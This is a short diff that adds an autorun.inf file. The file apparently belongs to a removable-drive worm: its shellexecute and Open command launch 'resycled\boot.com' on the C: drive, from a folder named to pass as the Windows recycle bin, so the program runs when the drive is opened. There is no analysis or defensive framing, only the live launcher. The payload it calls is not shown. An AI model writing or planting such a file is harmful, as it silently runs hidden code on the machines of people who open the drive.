@@ -1,0 +1,4 @@
+[autorun]
+shellexecute="resycled\boot.com c:"
+shell\Open\command="resycled\boot.com c:"
+shell=Open
